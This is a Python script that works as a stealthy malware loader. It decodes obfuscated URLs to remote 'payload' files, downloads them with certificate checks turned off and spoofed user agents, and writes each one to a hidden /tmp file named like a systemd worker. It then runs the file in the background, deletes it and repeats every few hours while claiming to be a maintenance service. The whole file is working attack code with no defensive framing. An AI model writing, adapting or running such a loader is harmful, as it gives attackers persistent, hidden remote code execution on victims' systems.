import subprocess
import time
import urllib.request
import ssl
import random
import os
import base64

# Obfuscated URLs (base64 encoded for stealth)
OBFUSCATED_URLS = [
    "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL21pbWlrcm9vdC9ldmlsL21haW4vcGF5bG9hZC5zaA==",
    "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL21pbWlrcm9vdC9ldmlsL21haW4vcGF5bG9hZC50eHQ="
]

# Random user agents to mimic legitimate traffic
USER_AGENTS = [
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
    'Wget/1.21.1',
    'curl/7.68.0'
]

def decode_urls():
    """Decode base64 URLs at runtime"""
    return [base64.b64decode(url).decode('utf-8') for url in OBFUSCATED_URLS]

def stealth_download(url):
    """Stealth download with random delays and SSL bypass"""
    try:
        # Random delay to avoid patterns
        time.sleep(random.uniform(2, 8))
        
        # SSL context to avoid certificate issues
        context = ssl.create_default_context()
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
        
        # Random user agent
        headers = {'User-Agent': random.choice(USER_AGENTS)}
        req = urllib.request.Request(url, headers=headers)
        
        # Download with timeout
        response = urllib.request.urlopen(req, context=context, timeout=30)
        return response.read().decode('utf-8')
        
    except Exception:
        return None

def execute_stealth(script_content):
    """Execute script with maximum stealth on Linux"""
    try:
        # Create temporary script with random name in /tmp
        script_id = random.randint(10000, 99999)
        temp_script = f"/tmp/.systemd-worker.{script_id}.sh"
        
        # Write script content
        with open(temp_script, 'w') as f:
            f.write("#!/bin/bash\n")
            f.write("# System maintenance script\n")
            f.write(script_content)
        
        # Make executable
        os.chmod(temp_script, 0o755)
        
        # Execute in background with nohup and disown
        result = subprocess.run(
            ["/bin/bash", "-c", f"nohup {temp_script} > /dev/null 2>&1 & disown"],
            capture_output=True,
            text=True,
            timeout=60
        )
        
        # Clean up after execution
        time.sleep(3)
        if os.path.exists(temp_script):
            os.remove(temp_script)
            
        return result
        
    except Exception:
        return None

def main():
    """Main stealth loop"""
    print("[+] Starting system maintenance service...")
    
    # Setup environment
    os.chdir('/tmp')
    urls = decode_urls()
    cycle = 0
    
    while True:
        try:
            cycle += 1
            
            # Process each URL
            for url in urls:
                content = stealth_download(url)
                if content and content.strip():
                    execute_stealth(content)
            
            # Random sleep between 1-4 hours to avoid detection
            sleep_hours = random.uniform(1, 4)
            sleep_seconds = int(sleep_hours * 3600)
            
            # Minimal logging (only every 5-10 cycles randomly)
            if cycle % random.randint(5, 10) == 0:
                print(f"[*] Maintenance cycle {cycle} completed. Next in {sleep_hours:.1f}h")
            
            time.sleep(sleep_seconds)
            
        except KeyboardInterrupt:
            print("\n[!] Service stopped by user")
            break
        except Exception:
            # Silent error recovery
            time.sleep(3600)  # Wait 1 hour on error

if __name__ == "__main__":
    main()
